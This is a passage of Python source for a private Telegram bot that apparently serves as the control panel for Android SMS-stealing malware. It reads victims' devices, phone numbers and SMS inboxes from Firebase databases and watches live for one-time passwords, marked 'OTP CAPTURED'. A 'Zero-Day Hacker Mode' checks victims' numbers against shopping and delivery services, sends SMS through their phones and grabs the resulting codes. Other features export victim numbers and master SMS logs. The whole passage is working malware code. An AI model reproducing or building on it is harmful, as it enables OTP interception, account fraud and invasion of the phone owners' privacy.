                    nums = extract_all_nums(data)
                    devices_list.append(Device(
                        id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                        status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
                        timestamp=int(data.get("timestamp") or 0), numbers=nums,
                        device_info=data.get("Device_info") or f"Device ID: {dev_id}",
                        sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
                    ))
            if clients_all and isinstance(clients_all, dict):
                for dev_id, client in clients_all.items():
                    if dev_id in added_set: continue
                    if not isinstance(client, dict): continue
                    
                    sim_list = client.get("sims", [])
                    s1 = sim_list[0] if isinstance(sim_list, list) and len(sim_list) > 0 else {}
                    s2 = sim_list[1] if isinstance(sim_list, list) and len(sim_list) > 1 else {}
                    
                    nums = extract_all_nums(client, s1, s2)
                    
                    if not nums and not client.get("modelName"): continue
                    added_set.add(dev_id)
                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
                    devices_list.append(Device(
                        id=dev_id, name=model, status=parse_status_bool(client.get("status")),
                        battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
                        device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}",
                        sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag, last_sms_ts=0.0
                    ))
        except Exception: pass
        return devices_list

async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
    if users_db is None: users_db = {}
    dbs_to_check = list(DATABASES.keys())
    for i, g_url in enumerate(SETTINGS.get("global_panels", [])):
        dbs_to_check.append(f"G_{i}")
    for uid, uinfo in all_users.items():
        if uid in ADMIN_IDS:
            for i, _ in enumerate(get_user_dbs(uinfo)):
                dbs_to_check.append(f"U_{uid}_{i}")

    all_gathered = []
    for tag in dbs_to_check:
        all_gathered.extend(GLOBAL_DEVICE_CACHE.get(tag, []))

    number_map = {}
    for d in all_gathered:
        if d.numbers:
            main_num = d.numbers[0]
            if main_num not in number_map:
                number_map[main_num] = d
            else:
                if d.timestamp > number_map[main_num].timestamp:
                    number_map[main_num] = d
        else:
            number_map[d.id] = d # Keep dev without numbers

    unique_devices = list(number_map.values())
    unique_devices.sort(key=lambda d: (0 if d.status == "online" else 1, -d.timestamp))
    return unique_devices

async def find_device_by_id(dev_id: str, bot_token: str, chat_id: int, users_db: dict) -> Optional[Device]:
    dev_id = str(dev_id).strip()
    for tag, devs in GLOBAL_DEVICE_CACHE.items():
        for d in devs:
            if d.id == dev_id: return d
    all_devs = await get_all_devices(bot_token, chat_id, users_db)
    for d in all_devs:
        if d.id == dev_id: return d
    return None

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

async def verify_recent_sms(device: Device, max_age_seconds=14400) -> bool:
    try:
        session = await get_http_session()
        url = f"{device.base_url}/{device.sms_path}.json?orderBy=\"$key\"&limitToLast=1"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                if isinstance(data, dict) and len(data) > 0:
                    max_sms_ts = max((float(v.get("timestamp") or 0) for v in data.values() if isinstance(v, dict)), default=0)
                    if max_sms_ts > 1e11: max_sms_ts /= 1000
                    if max_sms_ts > 0 and (time.time() - max_sms_ts) <= max_age_seconds: return True
    except: pass
    return False

async def live_otp_listener(app: Application, chat_id: int, message_id: int, device: Device, service: str, initial_keys: set, return_data: str):
    try:
        for _ in range(30): 
            await asyncio.sleep(2)
            data = await fb_get(device.sms_path + "?orderBy=\"$key\"&limitToLast=5", device.base_url)
            
            if data and isinstance(data, dict):
                for k, v in data.items():
                    if k not in initial_keys and isinstance(v, dict):
                        body = v.get("body") or v.get("message") or v.get("text") or ""
                        sender = v.get("sender") or "Unknown"
                        
                        if service.lower() in body.lower() or service.lower() in sender.lower() or extract_otp(body):
                            otp = extract_otp(body)
                            text = f"✅ **{service.upper()} OTP CAPTURED!** 🚀\n━━━━━━━━━━━━━━━━━━\n📱 **Number:** `+{device.numbers[0][-10:]}`\n👤 **From:** {sender}\n🔑 **OTP:** `{otp if otp else 'Check Message'}`\n\n💬 **Message:**\n_{body}_\n━━━━━━━━━━━━━━━━━━"
                            kb = [
                                [InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")] if otp else [],
                                [InlineKeyboardButton("🔄 Find Another Number", callback_data=return_data)],
                                [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
                            ]
                            kb = [row for row in kb if row] 
                            await app.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
                            return

        timeout_text = f"❌ **TIMEOUT**\n━━━━━━━━━━━━━━━━━━\n60 seconds over. No SMS received for {service.upper()} on `+{device.numbers[0][-10:]}`.\n\nThis number might be dead for incoming SMS. Please find another."
        kb = [
            [InlineKeyboardButton("🔄 Find Another Fresh Number", callback_data=return_data)],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]
        ]
        await app.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=timeout_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    except Exception:
        pass 

# ═══════════════════════════════════════════════════════
#  PAGINATION BUILDER FOR FRESH 30-MIN DEVICES
# ═══════════════════════════════════════════════════════

async def show_fresh30_page(message_obj, chat_id, page, bot_token, users_db):
    dev_ids = user_fresh_cache.get(chat_id, [])
    if not dev_ids:
        await safe_edit(message_obj, "❌ Error: Fresh List expired. Please scan again.", parse_mode="HTML")
        return

    total_devs = len(dev_ids)
    PAGE_SIZE = 5 
    total_pages = max(1, (total_devs + PAGE_SIZE - 1) // PAGE_SIZE) 
    page = max(0, min(page, total_pages - 1))

    start = page * PAGE_SIZE
    page_ids = dev_ids[start:start+PAGE_SIZE]

    devices = await get_all_devices(bot_token, chat_id, users_db)
    dev_map = {d.id: d for d in devices}

    text = f"🔥 **30-MIN FRESH INBOXES** 🔥\n━━━━━━━━━━━━━━━━━━\n✅ Total Active Numbers: {total_devs}\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\n*Select a number to view OTP:*"

    kb = []
    for did in page_ids:
        d = dev_map.get(did)
        if d and d.numbers:
            display_num = d.numbers[0] if str(d.numbers[0]).startswith("+") else f"+{d.numbers[0]}"
            lbl = f"📱 {display_num}  [{d.db_tag}]"
            kb.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
            kb.append([InlineKeyboardButton("📩 View Inbox", callback_data=f"msgs:{d.id}:f30_{page}")])

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev 5", callback_data=f"f30:{page-1}"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next 5 ➡️", callback_data=f"f30:{page+1}"))
    
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="home")])

    await safe_edit(message_obj, text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════
#  MESSAGE BUILDERS & UI
# ═══════════════════════════════════════════════════════

def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
    users_db = all_users
    user_spam_active = users_db.get(chat_id, {}).get("global_spam", False)
    spam_btn = "Global Spam: ON" if user_spam_active else "Global Spam: OFF"

    keys = [
        [KeyboardButton("🔥 30-Min Fresh Devices"), KeyboardButton("Search Number (God)")],
        [KeyboardButton("Devices List"), KeyboardButton("Auto-Check Panels")],
        [KeyboardButton("Scan Hidden Devices"), KeyboardButton("Manual Checker")],
        [KeyboardButton("Add Panel"), KeyboardButton("Select Panel")],
        [KeyboardButton("Admin Panel"), KeyboardButton("Super Admin")],
        [KeyboardButton(spam_btn)]
    ]
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def get_checker_menu(prefix="chk_srv:"):
    kb = [
        [InlineKeyboardButton("🥬 Bigbasket", callback_data=f"{prefix}bigbasket"), InlineKeyboardButton("🛍️ Meesho", callback_data=f"{prefix}meesho"), InlineKeyboardButton("🪐 Plutos", callback_data=f"{prefix}plutos")],
        [InlineKeyboardButton("⭐ Starexch", callback_data=f"{prefix}starexch"), InlineKeyboardButton("🍔 Swiggy", callback_data=f"{prefix}swiggy"), InlineKeyboardButton("🛒 Flipkart", callback_data=f"{prefix}flipkart")],
        [InlineKeyboardButton("👗 Shein", callback_data=f"{prefix}shein"), InlineKeyboardButton("👚 Myntra", callback_data=f"{prefix}myntra"), InlineKeyboardButton("🏨 Oyo", callback_data=f"{prefix}oyo")],
        [InlineKeyboardButton("🏢 Mantrimall", callback_data=f"{prefix}mantrimall"), InlineKeyboardButton("🟡 Blinkit", callback_data=f"{prefix}blinkit")],
        [InlineKeyboardButton("🛏️ Brevistay", callback_data=f"{prefix}brevistay"), InlineKeyboardButton("⚡ Ajio", callback_data=f"{prefix}ajio"), InlineKeyboardButton("📦 Amazon", callback_data=f"{prefix}amazon")],
        [InlineKeyboardButton("📱 MyJio", callback_data=f"{prefix}myjio"), InlineKeyboardButton("👓 Lenskart", callback_data=f"{prefix}lenskart")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(kb)

def format_checker_result(service: str, number: str, is_reg: bool, ms: int, is_error: bool = False, err_msg: str = ""):
    srv_name, emoji = service.capitalize(), "✨"
    for row in get_checker_menu().inline_keyboard:
        for btn in row:
            if service.lower() in btn.text.lower():
                parts = btn.text.split(" ")
                emoji, srv_name = parts[0], " ".join(parts[1:])
                break
    
    display_num = number if str(number).startswith("+") else f"+{number}"
    
    if is_error: return f"⚠️ <b>ERROR</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms\n\n<i>{err_msg}</i>"
    return f"<b>{'✅ REGISTERED' if is_reg else '❌ UNREGISTERED'}</b>\n\n{emoji} <b>{srv_name}</b>\n📱 {display_num}\n⚡ {ms} ms"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    PAGE_SIZE = 10 
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    
    progress = ""
    if SCAN_PROGRESS["completed"] < SCAN_PROGRESS["total"]:
        pct = int((SCAN_PROGRESS["completed"] / max(1, SCAN_PROGRESS["total"])) * 100)
        progress = f"🔄 Initial Scan: {SCAN_PROGRESS['completed']}/{SCAN_PROGRESS['total']} ({pct}%)\n"
        
    return (
        f"OTP PANEL PRO (PRIVATE)\n━━━━━━━━━━━━━━━━━━\n"
        f"{progress}"
        f"Online: {online}   Offline: {offline}\n"
        f"Total: {len(devices)} Devices\nPage {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\nSelect a number below:"
    )

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    PAGE_SIZE = 10 
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    start       = page * PAGE_SIZE
    page_devs   = devices[start : start + PAGE_SIZE]
    rows = []

    def _btn(d: Device) -> InlineKeyboardButton:
        tag  = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {tag}{d.numbers[0]}"
            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} {tag}{d.name} ({d.id[:6]})"
        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")

    for d in page_devs: rows.append([_btn(d)])

    nav = []
    if page > 0: nav.append(InlineKeyboardButton("Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("Refresh", callback_data="home"), InlineKeyboardButton("Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 {tag}{d.numbers[0]}"
                if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
            else:
                lbl = f"🟢 {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("Refresh", callback_data="online"), InlineKeyboardButton("All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    lines  = []
    if otp: lines.append(f"OTP: {otp}")
    lines.append(f"From: {sender}\nDate: {date}")
    if sim: lines.append(f"SIM: {sim}")
    lines.append(f"Number: {num_label}\n\nMessage: {body}")
    return "\n".join(lines), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    
    if otp:
        sim_line = f"│ SIM : {sim}\n" if sim else ""
        return f"NEW OTP RECEIVED\n━━━━━━━━━━━━━━━━━━\n│ OTP : {otp}\n│ Number : {num_label}\n│ From : {sender}\n│ Date : {date}\n{sim_line}━━━━━━━━━━━━━━━━━━\n{body}"
    return f"NEW SMS RECEIVED\n━━━━━━━━━━━━━━━━━━\nNumber : {num_label}\nFrom : {sender}\nDate : {date}\n━━━━━━━━━━━━━━━━━━\n{body}"

def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton("Disconnect & Back", callback_data="home")],
    ])

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users
    total    = len(users_db)
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    
    text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\nTotal OTP Views: {total_otps}\n"
    text += f"━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")],
        [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")],
        [InlineKeyboardButton("Export Online Numbers", callback_data="sa_export_numbers")], 
        [InlineKeyboardButton("Download SMS Logs (.txt)", callback_data="sa_download_logs")],
        [InlineKeyboardButton("Refresh", callback_data="admin_refresh"), InlineKeyboardButton("Close", callback_data="close_msg")]
    ]
    return InlineKeyboardMarkup(keys)

async def safe_edit(query_or_msg, text, reply_markup=None, parse_mode=None, disable_web_page_preview=False):
    try:
        if hasattr(query_or_msg, 'edit_message_text'):
            await query_or_msg.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
        elif hasattr(query_or_msg, 'edit_text'):
            await query_or_msg.edit_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest as e:
        if "not modified" not in str(e).lower(): tlog(f"Edit Message Error: {e}")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    bot_token = ctx.bot.token
    
    if chat_id not in ADMIN_IDS:
        await update.message.reply_text("You do not have access to this private bot. 🚫")
        return

    users_db = all_users
    user = update.effective_user
    user_focus.setdefault(bot_token, {}).pop(chat_id, None)

    chats_registry.setdefault(bot_token, set()).add(chat_id)
    text = f"OTP PANEL (PRIVATE ADMIN EDITION)\n━━━━━━━━━━━━━━━━━━\nWelcome Master {user.first_name}!\nSystem is connected and ready."
    await update.message.reply_text(text, reply_markup=get_reply_menu(chat_id))

# ═══════════════════════════════════════════════════════
#  CALLBACK QUERY HANDLER 
# ═══════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    data    = query.data or ""
    chat_id = query.message.chat_id
    bot_token = ctx.bot.token

    if chat_id not in ADMIN_IDS:
        await query.answer("You do not have access to this private bot. 🚫", show_alert=True)
        return

    await query.answer()
    users_db = all_users

    try:
        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data.startswith("f30:"):
            page = int(data.split(":")[1])
            await show_fresh30_page(query, chat_id, page, bot_token, users_db)
            return

        if data == "open_checker_menu":
            await safe_edit(query, "<b>Select Checker (Manual Bulk)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")
            return

        if data == "open_auto_checker_menu":
            await safe_edit(query, "🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")
            return

        if data.startswith("chk_srv:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:")
            return

        if data.startswith("auto_fb:"):
            service = data.split(":")[1]
            print(f"[*] Started Auto-Check for {service.upper()}...")
            await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching ONLINE devices active in last 4 HOURS...</i>", parse_mode="HTML")
            
            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not all_devices:
                all_devices = await get_all_devices(bot_token, chat_id, users_db)
            
            fresh_devices = []
            for d in all_devices:
                if d.status == "online" and d.numbers:
                    ts = d.timestamp
                    if ts > 1e11: 
                        ts = ts / 1000
                    if (time.time() - ts) <= 14400:  
                        fresh_devices.append(d)
            
            if not fresh_devices: 
                return await safe_edit(query, "❌ Koi bhi number pichle 4 ghante me online nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            
            fresh_devices.sort(key=lambda d: d.timestamp, reverse=True)
            top_fresh = fresh_devices[:30] 
            random.shuffle(top_fresh)
            fresh_devices = top_fresh + fresh_devices[30:]
            
            seen_set = user_seen_unreg.setdefault(chat_id, set())
            if len(seen_set) > 1000: seen_set.clear() 
            
            fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
            
            found_unreg, final_res, final_dev, final_num = False, None, None, ""
            total_scan = len(fresh_devices)
            
            if total_scan == 0:
                return await safe_edit(query, "✅ Saare numbers already check ho chuke hain. Kuch der baad try karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

            BATCH_SIZE = 10  
            last_edit_time = 0
            registered_list = [] 
            
            for i in range(0, total_scan, BATCH_SIZE):
                batch = fresh_devices[i:i+BATCH_SIZE]
                
                now = time.time()
                if now - last_edit_time > 2.5:
                    print(f"[*] Scanning Batch... [{min(i+BATCH_SIZE, total_scan)}/{total_scan}]")
                    await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Scanning Active Numbers... [{min(i+BATCH_SIZE, total_scan)}/{total_scan}]\n⚡ <i>Validating SMS.json & Hitting APIs...</i>", parse_mode="HTML")
                    last_edit_time = now
                
                sms_verifications = await asyncio.gather(*[verify_recent_sms(d) for d in batch])
                
                valid_batch = []
                for d, is_valid in zip(batch, sms_verifications):
                    ts = d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000
                    if (time.time() - ts) <= 900:
                        valid_batch.append(d)
                    elif is_valid: 
                        valid_batch.append(d)
                
                if not valid_batch:
                    continue

                tasks = [check_number_api(service, dev.numbers[0]) for dev in valid_batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for dev, res in zip(valid_batch, results):
                    if isinstance(res, Exception) or res.get("status") == "error":
                        continue
                        
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    
                    if not is_reg:
                        print(f"[!] Unregistered Found: {dev.numbers[0]}")
                        found_unreg, final_res, final_dev, final_num = True, res, dev, dev.numbers[0]
                        break 
                    else:
                        registered_list.append(dev.numbers[0])
                
                if found_unreg:
                    break 
                    
                await asyncio.sleep(0.5) 
            
            file_path = None
            if registered_list:
                file_name = f"Registered_{service.upper()}_{int(time.time())}.txt"
                file_path = os.path.join(SYS_DIR, file_name)
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write("\n".join(list(set([f"+91{num[-10:]}" for num in registered_list]))))

            if found_unreg:
                seen_set.add(final_num)
                
                await safe_edit(query, f"🔥 **ZERO-DAY HACKER MODE**\n━━━━━━━━━━━━━━━━━━\n🎯 **Unregistered Found:** `+{final_num[-10:]}`\n\n💉 *Injecting 5 Auto-Wakeup SMS to bypass network sleep...*", parse_mode="Markdown")
                
                wake_msgs = [
                    f"Dear User, your {service.upper()} verification code will arrive shortly.",
                    "Network Activity Ping 1...",
                    "System checking active status...",
                    f"Please keep your phone active for {service.upper()} OTP.",
                    "Network Wakeup Ping 2..."
                ]
                for w_msg in wake_msgs:
                    await fb_send_sms(final_dev, final_num, w_msg)
                    await asyncio.sleep(0.3)

                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                kb = [
                    [InlineKeyboardButton("📩 View Inbox (Get OTP)", callback_data=f"msgs:{final_dev.id}:{service}")],
                    [InlineKeyboardButton("🔄 Find Another Fresh Number", callback_data=data)],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="close_msg")]
                ]
                await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
                
                if file_path:
                    try: await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename=file_name, caption=f"📁 Auto-skipped {len(registered_list)} registered numbers.")
                    except: pass
                return
            else:
                if registered_list:
                    res_text = f"<b>✅ ALL REGISTERED</b>\n\nI scanned {total_scan} fresh numbers and aggressively hit APIs. Found {len(registered_list)} active numbers, but ALL are already registered on {service.upper()}."
                else:
                    res_text = f"<b>✅ ALL REGISTERED (Or Empty Inbox)</b>\n\nI scanned {total_scan} fresh numbers from the last 4 Hours. No valid SMS inbox found."
                
                kb = [[InlineKeyboardButton("🔄 Scan Again", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]
                await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
                
                if file_path:
                    try: await ctx.bot.send_document(chat_id=chat_id, document=open(file_path, "rb"), filename=file_name, caption=f"📁 Line-by-Line list of Registered Numbers on {service.upper()}")
                    except: pass
                return

        if data.startswith("search_num:"):
            search_term = data.split(":")[1]
            await safe_edit(query, f"⏳ Searching databases for {search_term}...")
            
            all_devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not all_devices:
                all_devices = await get_all_devices(bot_token, chat_id, users_db)
                
            found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers) and d.status == "online"]
            if not found_devs: return await safe_edit(query, f"📭 No online devices found for {search_term}.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
            rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
            return await safe_edit(query, f"🔍 Search Results for: {search_term}\nSelect below:", reply_markup=InlineKeyboardMarkup(rows))

        if data.startswith("set_panel:"):
            panel_type = data.split(":")[1]
            users_db.setdefault(chat_id, {})["selected_panel"] = panel_type
            save_user(chat_id)
            await safe_edit(query, f"PANEL UPDATED\n━━━━━━━━━━━━━━━━━━\nAapka panel ab {panel_type} par set ho gaya hai.\nAb 'Devices List' open karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            return

        if data == "sa_add_global_panel":
            pending_action[chat_id] = {"action": "sa_set_global_panel"}
            await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL (ya multiple URLs enter se separate karke) bhejein.\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))
            return

        if data == "sa_view_user_panels":
            msg_text = "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
            for uid, uinfo in users_db.items():
                dbs = get_user_dbs(uinfo)
                if dbs:
                    msg_text += f"User: {uid}\n"
                    for db in dbs: msg_text += f"{db}\n"
                    msg_text += "\n"
            if msg_text == "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n":
                msg_text += "Koi custom panel nahi mila."
            if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
            await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))
            return

        if data == "sa_export_numbers":
            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not devices:
                devices = await get_all_devices(bot_token, chat_id, users_db)
            online_nums = []
            for d in devices:
                if d.status == "online":
                    online_nums.extend(d.numbers)
                    
            if not online_nums:
                await query.answer("Filhal koi bhi number online nahi hai.", show_alert=True)
                return
                
            file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
            unique_online = set(online_nums)
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("\n".join(unique_online))
            await ctx.bot.send_document(
                chat_id=chat_id, 
                document=open(file_path, "rb"), 
                filename="Active_Online_Numbers.txt", 
                caption=f"Total Active Unique Numbers: {len(unique_online)}"
            )
            return

        if data == "sa_download_logs":
            if not os.path.exists(SMS_LOG_FILE):
                await query.answer("Log file abhi tak bani nahi hai.", show_alert=True)
                return
            await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_SMS_Log.txt", caption="Master SMS Database Log")
            return

        if data == "sa_backup":
            await save_data_async()
            await query.answer("Database forcefully backed up!", show_alert=True)
            return

        if data == "sa_broadcast":
            pending_action[chat_id] = {"action": "broadcast_msg"}
            await safe_edit(query, "GLOBAL BROADCAST\n\nType the message you want to broadcast below:\n\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="close_msg")]]))
            return

        if data == "admin_refresh":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token))
            return

        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            pending_action.pop(chat_id, None)
            
            # 🔥 INSTANT UI FIX FOR HOME ROUTE
            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not devices:
                wait_msg = await query.message.reply_text("⏳ Loading Devices List...")
                devices = await get_all_devices(bot_token, chat_id, users_db)
                await safe_edit(wait_msg, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
            else:
                await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
            return

        if data.startswith("pg:"):
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            page = int(data[3:])
            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not devices:
                devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
            return

        if data == "online":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            devices = GLOBAL_DEVICE_CACHE.get("ALL", [])
            if not devices:
                devices = await get_all_devices(bot_token, chat_id, users_db)
            await safe_edit(query, f"ONLINE NUMBERS\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices))
            return

        if data.startswith("cp:"):
            await query.answer(f"OTP: {data[3:]}", show_alert=True)
            return

        if data.startswith("sel:"):
            dev_id = data[4:]
            device = await find_device_by_id(dev_id, bot_token, chat_id, users_db)
            
            if not device:
                await query.answer("Device not found! List purani ho gayi hai, refresh karein.", show_alert=True)
                return
            
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"CONNECTED TO DEVICE\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nYou are now receiving LIVE OTPs for this number. Click Disconnect to stop."
            await safe_edit(query, text, reply_markup=device_action_keyboard(dev_id))
            return

        if data.startswith("msgs:"):
            parts = data.split(":")
            dev_id = parts[1]
